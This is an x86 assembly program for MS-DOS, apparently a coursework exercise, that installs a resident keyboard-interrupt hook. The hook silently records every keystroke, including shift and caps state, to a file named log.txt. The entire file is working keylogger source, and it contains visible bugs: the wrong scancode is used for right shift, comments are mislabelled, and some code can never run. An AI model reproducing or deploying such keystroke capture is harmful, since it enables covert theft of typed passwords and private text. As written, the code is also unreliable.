.model small
.stack 1000
.data    
    old_2fh dd 0
    old_09h dd 0
    resident_program_message db 'Program is resident!', '$'   
    already_resident_program_message db 'Program is already resident!', '$'
.code
.386
    scancode db ?
    char db ?
    char_size db ?
    PSP dw ?
    filename db 'log.txt',0
    shift_flag db 0
    caps_flag db 0
    
    ASCIITable db "Esc"
               db "1!"
               db "2@"
               db "3#"
               db "4$"
               db "5%"
               db "6^"
               db "7&"
               db "8*"
               db "9("
               db "0)"
               db "-_"
               db "=+"
    backSpace  db "BackSpace"
    tab        db "Tab"
    line_1     db "qQ"
               db "wW"
               db "eE"
               db "rR"
               db "tT"
               db "yY"
               db "uU"
               db "iI"
               db "oO"
               db "pP"
               db "[{"
               db "]}"
     enter     db "Enter"
     ctrl      db "Ctrl "
     line_2    db "aA"
               db "sS"
               db "dD"
               db "fF"
               db "gG"
               db "hH"
               db "jJ"
               db "kK"
               db "lL"
               db ";:"
               db 27h, 22h; ' and " characters
               db "`~"
    lShift     db "LShift"
    sumb_1     db "\|"
    line_3     db "zZ"
               db "xX"
               db "cC"
               db "vV"
               db "bB"
               db "nN"
               db "mM"
               db ",<"
               db ".>"
               db "/?"
    rShift     db "RShift"
    alt        db "Alt"
    space      db "SpaceBar"
    caps       db "CapsLock"
    F          db "F1 "
               db "F2 "
               db "F3 "
               db "F4 "
               db "F5 "
               db "F6 "
               db "F7 "
               db "F8 "
               db "F9 "
               db "F10"
    delete     db "Delete"
    pause      db "Pause"
    prtSc      db "PrtSc"
    home       db "Home"           
    numLock    db "NumLock"
    operation  db "*"
    numbers    db "789-456+1230."
    f11        db "F11"
    f12        db "F12"
    up         db "Up"
    down       db "Down"
    right      db "Right"
    left       db "Left"
               
    new_line db 0Dh,0Ah           
    
    asc_count equ 39h
    
Exit proc
    mov ax,4C00h
    int 21h
    ret
Exit endp

OutputString macro str
    mov ah, 09h
    mov dx, offset str
    int 21h
endm

New_2fh proc
    cmp ah, 0f1h ;check multiplex. int. function number
    jne out_2fh ;not f1h -> out
    cmp al, 00h ;try to repeat installation?
    je inst ;tell it's restricted
    
    jmp short out_2fh ;function is undefined -> out
inst:  
    mov al, 0ffh ;program is already resident
    iret
out_2fh:
    jmp dword ptr ds:old_2fh
    iret 
New_2fh endp

New_09h proc        
    push ds si es di dx cx bx ax  
    
    xor ax, ax 
    in  al, 60h ;load data from port 60h to register             
    call getASCII ;get scancode
    mov char, al
    cmp char, 0
    je OldHandler       

PutChar:    
;---- put char into file -----;         
    push cs ;make ds point to cs
    pop ds
    
    mov ah, 3Dh ;open file
    mov al, 1 ;write mode
    mov dx, offset filename  
    int 21h
    jnc writeChar    
    
noFile:
; failed -> try to create file
    mov ah, 5Bh
    mov cx, 0
    lea dx, filename 
    int 21h
    jc OldHandler ;failed again -> proceed  
    
WriteChar:            
    mov bx, ax ;df to bx
    
    xor cx, cx                
    xor dx, dx                
    mov ax, 4202h ;set fp to end of file
    int 21h   
    
    mov ah, 40h ;write
    mov cl, char_size        
    mov dx, di      
    int 21h 
    
    mov ah, 40h ;write
    mov cl, 2        
    mov dx, offset new_line      
    int 21h 
    
    mov ah, 3Eh ;close file
    int 21h
        
OldHandler: 
    pop ax bx cx dx di es si ds                       
    jmp dword ptr cs:old_09h ;call default handler
    xor ax, ax
    mov al, 20h 
    out 20h, al ;data output to port 20h
    call Exit
            
EndInt_09h:
    xor ax, ax
    mov al, 20h
    out 20h, al ;data output to port 20h
     
    pop ax bx cx dx di es si ds 
    iret
New_09h endp

GetASCII proc
    cmp al, 1
    je GetEsc
    cmp al, 0Eh
    je GetBackSpace
    cmp al, 0Fh
    je GetTab
    cmp al, 1Ch
    je GetEnter
    cmp al, 1Dh
    je GetCtrl
    cmp al, 2Bh
    je GetSumb1
    cmp al, 38h
    je GetAlt
    cmp al, 39h
    je GetSpace
    cmp al, 45h
    je GetNumLock
    cmp al, 37h 
    je GetMul
    cmp al, 57h
    je GetF11
    cmp al, 58h
    je GetF12
    
CheckShifts:    
;check if special keys were pressed
    cmp al, 2Ah     ;left shift?
    je ShiftPressed
    cmp al, 39h     ;right shift?
    je ShiftPressed 
    cmp al, 3Ah     ;left shift?
    je CapsPressed    
;check if special keys were released    
    sub al, 80h
    cmp al, 2Ah     ;left shift?
    je ResetShift
    cmp al, 39h     ;right shift?
    je ResetShift 
    cmp al, 3Ah     ;left shift?
    je CapsPressed             
    
    ;if special keys weren't the case
; + we don't handle other keys releases
    add al, 80h      
    cmp al, 80h
    ja FlagsHandled
          
    xor cx, cx      
    cmp al,0Eh
    jb GetNumbers
    cmp al, 1Ch
    jb GetLine1
    cmp al, 2Ah
    jb GetLine2
    cmp al, 36h
    jb GetLine3
    cmp al, 45h
    jb GetF

GetNumbers_NumLock:
    mov di, offset numbers
    add cx, 47h
    
GetNumbers_NumLock_loop:
    cmp cl, al
    jae GetNumbers_NumLock_end
    add di, 1
    add cl, 1
    jmp GetNumbers_NumLock_loop
    
GetNumbers_NumLock_end:    
    mov char_size, 1
    jmp GetASCII_end
    
GetF:
    mov di, offset F
    add cx, 3Bh
GetF_loop:    
    cmp cl, al
    jae GetF_end
    add di, 3
    add cl, 1
    jmp GetF_loop
    
GetF_end:
    mov char_size, 3
    jmp GetASCII_end
    
GetLine3:
    mov di, offset line_3
    add cx, 2Ah
    jmp CheckFlags
    
GetLine2:
    mov di, offset line_2
    add cx, 1Ch
    jmp CheckFlags    
     
GetLine1:
    mov di, offset line_1
    add cx, 0Eh
    jmp CheckFlags
    
GetNumbers:
    mov di, offset ASCIITable+3
    jmp CheckFlags
    
GetSumb1:
    mov di, offset sumb_1
    add cx, 2Bh
    jmp CheckFlags

;decide if lower case or higher case is required
CheckFlags:        
    cmp caps_flag, 0
    jne CapsNotActive
    cmp shift_flag, 0
    je LowCase
    jmp UpCase
     
GetEsc:
    mov di, offset ASCIITable
    mov char_size, 3
    jmp GetASCII_end
    
GetBackSpace:
    mov di, offset backSpace
    mov char_size, 9
    jmp GetASCII_end
    
GetTab: 
    mov di, offset tab
    mov char_size, 3
    jmp GetASCII_end
    
GetEnter:
    mov di, offset enter
    mov char_size, 5
    jmp GetASCII_end
    
GetCtrl:
    mov di, offset ctrl
    mov char_size, 4
    jmp GetASCII_end

GetAlt:
    mov di, offset alt
    mov char_size, 3
    jmp GetASCII_end
    
GetSpace:
    mov di, offset space
    mov char_size, 8
    jmp GetASCII_end
    
GetNumLock:
    mov di, offset numlock
    mov char_size, 7
    jmp GetASCII_end

GetMul:
    mov di, offset operation
    mov char_size, 1
    jmp GetASCII_end
    
GetF11:
    mov di, offset f11
    mov char_size, 3
    jmp GetASCII_end
    
GetF12:
    mov di, offset f12
    mov char_size, 3
    jmp GetASCII_end
    
CapsNotActive:
    cmp shift_flag, 1
    je LowCase
    jmp UpCase    
    
ShiftPressed:
    mov shift_flag, 1
    jmp FlagsHandled 
    
ResetShift:
    mov shift_flag, 0
    jmp FlagsHandled
     
CapsPressed:
    cmp caps_flag, 0
    jne ResetCaps
    mov caps_flag, 1
    jmp FlagsHandled 
    
ResetCaps:
    mov caps_flag, 0
    jmp FlagsHandled    
    
LowCase:    
    mov char_size, 1
    add cx, 2                    
    jmp skip
    
UpCase:    
    add di, 1
    mov char_size, 1
    add cx, 2        
     
Skip:
    cmp cl, al
    jae get
    add di, 2
    add cl, 1
    jmp skip 
     
Get:
    mov char_size, 1
    jmp GetASCII_end    
NotChar:
    mov al, 01h
    jmp GetASCII_end
    
FlagsHandled:
    xor ax, ax
GetASCII_end:        
    ret
getASCII endp

HandlerInit proc
;get the address of the interrupt handler
    mov ah, 35h
    mov al, 09h
    int 21h
    mov word ptr old_09h, bx
    mov word ptr old_09h+2, es
;set the address of the interrupt handler
    mov ah, 25h
    mov al, 09h
    mov dx, seg New_09h
    mov ds, dx
    mov dx, offset New_09h
    int 21h
    
;get the address of the interrupt handler
    mov ah, 35h
    mov al, 2fh
    int 21h
    mov word ptr old_2fh, bx
    mov word ptr old_2fh+2, es
;set the address of the interrupt handler
    mov ah, 25h
    mov al, 2fh
    mov dx, seg New_2fh
    mov ds, dx
    mov dx, offset New_2fh
    int 21h
    
;leave the program resident
    mov ax, 3100h
    mov cx, [PSP]
    mov dx, offset HandlerInit
    sub dx, cx
    int 21h  
    ret
HandlerInit endp

start: 
    push ds
    mov ax, @data
    mov ds, ax
    mov es, ax
    pop [PSP]
    mov ah, 0f1h ;check if program is already resident
    mov al, 0          
    int 2fh
    cmp al, 0ffh ;if it's resident - exit
    jne IsNotResidentNow
    
    OutputString already_resident_program_message
    jmp _end 
    
IsNotResidentNow:
    OutputString resident_program_message
    
    cli ;disallow interruptions
    call HandlerInit  
    sti ;allow interruptions  
    
_end:
    call Exit  
end start